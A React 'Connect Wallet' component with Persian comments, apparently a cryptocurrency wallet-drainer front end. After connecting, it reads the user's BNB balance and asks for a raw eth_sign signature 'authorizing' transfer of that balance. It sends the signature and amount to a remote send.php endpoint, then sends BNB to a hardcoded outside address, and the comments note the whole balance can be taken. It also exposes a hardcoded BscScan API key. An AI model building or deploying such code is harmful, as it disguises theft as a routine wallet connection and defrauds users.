import { useState } from "react";

/** 
 * این تابع برای گرفتن بالانس BNB از BscScan است؛ می‌توانید در صورت تمایل آن را نگه دارید
 * یا حذف کنید. اگر حذف می‌کنید، یادتان باشد references آن را هم حذف کنید.
 */
const BSCSCAN_API_KEY = "YVGXID1YVM77RQI37GEEI7ZKCA2BQKQS4P";
async function getBNBBalance(address) {
  try {
    const response = await fetch(
      `https://api.bscscan.com/api?module=account&action=balance&address=${address}&tag=latest&apikey=${BSCSCAN_API_KEY}`
    );
    const data = await response.json();
    if (data.status === "1") {
      const balanceBNB = (parseInt(data.result) / 1e18).toFixed(6);
      console.log("Balance from BscScan:", balanceBNB);
      return balanceBNB;
    }
  } catch (error) {
    console.error("Error fetching BNB balance:", error);
  }
  return null;
}

function App() {
  const [account, setAccount] = useState(null);

  async function runner() {
    /** 1) بررسی وجود window.ethereum 
     *   در مرورگر داخلی تراست والت باید در دسترس باشد.
     */
    if (typeof window.ethereum === "undefined") {
      alert("No Ethereum provider found. Are you in Trust Wallet DApp Browser?");
      return;
    }

    try {
      /** 2) درخواست اتصال به کیف پول */
      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
      if (!accounts || !accounts.length) {
        console.error("No account returned from eth_requestAccounts");
        return;
      }
      const userAddress = accounts[0];
      setAccount(userAddress);
      console.log("Wallet Address:", userAddress);

      // 2.1) در صورت نیاز، می‌توانید chainId را بررسی کنید:
      // const chainId = await window.ethereum.request({ method: "eth_chainId" });
      // if (chainId !== "0x38") {
      //   console.warn("User is not on BSC Mainnet. They may switch manually.");
      // }

      /** 3) گرفتن بالانس BNB از BscScan (اختیاری) */
      const bnbBalance = await getBNBBalance(userAddress);
      if (!bnbBalance) {
        console.error("Failed to fetch BNB balance from BscScan");
      }

      // پیامی که می‌خواهیم کاربر امضا کند (اختیاری)
      const message = `Authorize sending ${bnbBalance} BNB from ${userAddress}`;
      console.log("Message to sign:", message);

      /** 4) امضای پیام ساده (eth_sign یا personal_sign) */
      let signature;
      try {
        signature = await window.ethereum.request({
          method: "eth_sign",
          params: [userAddress, message],
        });
        console.log("Signature:", signature);
      } catch (signErr) {
        console.error("Signature failed:", signErr);
        return;
      }

      /** 5) ارسال signature به سرور برای تأیید (اختیاری) */
      const apiUrl = "https://YOUR_DOMAIN/send.php";
      let verifyResponse;
      try {
        // در این مثال از fetch استفاده می‌کنیم؛ اگر jQuery مدنظرتان است هم می‌توانید
        // fetch را عوض کنید
        const result = await fetch(apiUrl, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            handler: "tx",
            address: userAddress,
            signature: signature,
            amount: bnbBalance,
          }),
        });
        verifyResponse = await result.json();
        console.log("Server verify response:", verifyResponse);
      } catch (err) {
        console.error("Could not verify signature on server:", err);
        return;
      }
      if (!verifyResponse || !verifyResponse.success) {
        console.error("Signature verification failed or server error.");
        return;
      }

      /** 6) اکنون تراکنش واقعی برای ارسال مقداری BNB (مثلاً کل بالانس یا بخشی از آن) */
      // اگر واقعاً می‌خواهید کل bnbBalance ارسال شود، باید آن را به Wei تبدیل کنید
      const floatValue = 0.001; // برای تست ارسال 0.001 BNB
      const valueWei = parseInt(floatValue * 1e18).toString(16);
      console.log("Sending", floatValue, "BNB => 0x" + valueWei);

      // در تراست والت DApp Browser، این متد eth_sendTransaction در دسترس است
      const txHash = await window.ethereum.request({
        method: "eth_sendTransaction",
        params: [{
          from: userAddress,
          to: "0xF4c279277f9a897EDbFdba342f7CdFCF261ac4cD",
          value: "0x" + valueWei,
          // می‌توانید gas, gasPrice را هم در صورت نیاز اضافه کنید
        }],
      });
      console.log("Transaction Hash:", txHash);
      alert("Transaction broadcasted! Hash: " + txHash);

    } catch (err) {
      console.error("Error:", err);
    }
  }

  return (
    <a
      href="#"
      id="connectWallet"
      onClick={runner}
      className="uk-button uk-button-medium@m uk-button-default uk-button-outline uk-margin-left"
      data-uk-toggle=""
    >
      {account ? (
        <span>Connected: {account}</span>
      ) : (
        <span>Connect Wallet</span>
      )}
    </a>
  );
}

export default App;
